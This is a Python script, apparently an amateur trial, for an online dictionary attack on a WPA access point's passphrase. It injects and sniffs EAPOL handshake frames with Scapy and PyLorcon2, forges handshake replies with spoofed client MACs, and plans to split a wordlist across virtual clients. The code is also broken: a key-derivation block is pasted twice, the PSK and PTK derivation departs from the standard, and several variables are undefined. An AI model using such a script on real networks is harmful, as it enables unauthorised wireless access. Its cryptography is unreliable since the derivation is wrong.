# Client to AP trial for eapol
from scapy.all import *
import PyLorcon2
from random import randint
from passlib.hash import pbkdf2_sha256
import hmac, hashlib, pyDes
from random import randint

interface = "wlan0"

injector = PyLorcon2.Context(iface = interface)	# creating PyLorcon Object
injector.open_injmon()	# open context in inject and monitor mode
# injector.get_channel()	# returns 3
# print ':'.join(str(i) for i in injector.get_hwmac())
# injector.set_channel(21) # channel set to 11 # ?
# injector.send_bytes(packet)	ost probable way to send

# defining addresses
destination_addr = '\x70\x1a\x04\xe8\xe1\x7c'
bss_id_addr = destination_addr # Client to AP

# ------------------------------------------------------------ #
# create VWCs here
# let each VWC choose a different MAC address
# give a part of the dictionary to each VWC

def OverallAttack(passphrase):	
	# The whole attack in a function
	# too rad, eh?
	source_addr = '\x50\xb7\xc3\xe5\x7d\x09'

	# packet formation
	packet = '\xb0\x00'
	packet += '\x00\x00'
	packet += destination_addr
	packet += source_addr
	packet += bss_id_addr
	# sequence number
	packet += '\x90\x70'


	# message 1
	# sniffing ANonce
	ANonce = ''
	EAPoL_header = '' 

	def sniffEAPoL(p):
		if p[0].haslayer(EAPOL):
			print p[0]
			print p[EAPOL].data
			print 'ANonce = '
			global ANonce 
			global EAPoL_header 
			EAPoL_header = p[EAPOL]
			ANonce = p[EAPOL].data.split('Message 1 = ')[1]
			print ANonce

	sniff(iface = interface, filter="wlan proto 0x888e", prn = sniffEAPoL)

	# ------------------------------------------------------------ #
	# message 2
	# sending MIC and SNonce 

	# SNonce generation
	SNonce = bin(randint(0,2**32))
	print "SNonce : " + str(SNonce)

	# Key Generation
	# PSK  
	print 'PSK: ' 
	PSK = pbkdf2_sha256.using(salt = ssid, salt_size = len(ssid), rounds = 4096).hash(passphrase)
	PSK = str(PSK.split('$')[4]).replace('.','+')+'=='
	PSK = PSK.decode('base64').encode('hex')
	# print PSK, len(PSK)
	print PSK
	print 'Length of PSK (bits): ' + str(int(len(PSK))*4) + '\n'

	# PMK 
	print 'PMK: '
	PMK = pbkdf2_sha256.using(salt = ssid, salt_size = len(ssid), rounds = 4096).hash(PSK)
	PMK = str(PMK.split('$')[4]).replace('.','+')+'=='
	PMK = PMK.decode('base64').encode('hex')
	# print PMK, len(PMK)
	print PMK
	print 'Length of PMK (bits): ' + str(int(len(PMK))*4) + '\n'
	# Key Generation
	# PSK  
	print 'PSK: ' 
	PSK = pbkdf2_sha256.using(salt = ssid, salt_size = len(ssid), rounds = 4096).hash(passphrase)
	PSK = str(PSK.split('$')[4]).replace('.','+')+'=='
	PSK = PSK.decode('base64').encode('hex')
	# print PSK, len(PSK)
	print PSK
	print 'Length of PSK (bits): ' + str(int(len(PSK))*4) + '\n'

	# PMK 
	print 'PMK: '
	PMK = pbkdf2_sha256.using(salt = ssid, salt_size = len(ssid), rounds = 4096).hash(PSK)
	PMK = str(PMK.split('$')[4]).replace('.','+')+'=='
	PMK = PMK.decode('base64').encode('hex')
	# print PMK, len(PMK)
	print PMK
	print 'Length of PMK (bits): ' + str(int(len(PMK))*4) + '\n'

	# PTK
	key_data = min(ap_mac,s_mac) + max(ap_mac,s_mac) + min(ANonce, SNonce) + max(ANonce, SNonce)
	pke = "Pairwise key expansion"  

	# Install PTK to be received from the access point 
	# But for convenience, we use Install_PTK = True
	# Install_PTK = True

	def PRF383(key,A,B):  # function for PRF383
	    blen = 48	# 384 bits # number of bytes = 48
	    i    = 0
	    R    = ''
	    while i <= ((blen*8+159)/160):
	        hmacsha256 = hmac.new(key, A+chr(0x00)+B+chr(i), hashlib.sha256)
	        i += 1
	        R += hmacsha256.digest()
	    return R[:blen]

	# if Install_PTK:
	PTK = PRF383(PMK, pke, key_data).encode('hex')	# hex string of 96 
	# Other Keys
	KCK = PTK[:32]
	KEK = PTK[32:64]
	TK = PTK[64:]
	print 'PTK: ' + '\n' + PTK

	print 'Length of PTK (bits): ' + str(len(PTK)*4) + '\n'
	print 'KCK: ' + '\n' + KCK
	print 'Length of KCK (bits): ' + str(len(KCK)*4) + '\n'
	print 'KEK: ' + '\n' + KEK
	print 'Length of KEK (bits): ' + str(len(KEK)*4) + '\n'
	print 'TK: ' + '\n' + TK
	print 'Length of TK (bits): ' + str(len(TK)*4) + '\n'

	# Calculation of MIC
	MIC = hmac.new(KCK, EAPoL_header, hashlib.sha256).digest()

	packet += 'Message 2 = '
	packet += SNonce + '/' + MIC

	# Message 3 
	# receive either Message 3 or deauthentication frame
	# may also receive Message 1 again
	# but our AP will only send deauth frame for our convenience

	# attackResult function
	def attackResult(pckt):
		if pckt[EAPOL].subtype == '\xb0\x00':
			print 'Attack Successful'
		elif pckt[EAPOL].subtype == '\xc0\x00':
			# end the current thread here 
			print 'Passphrase not found'

	sniff(iface = interface, filter="wlan proto 0x888e", prn = attackResult)

	# end of handshake
	# change MAC address and create new VWC, maybe ?


# ----------------------------------------------------------- #
# now VWC creation code here
# give each VWC to use the above function

OverallAttack("Password")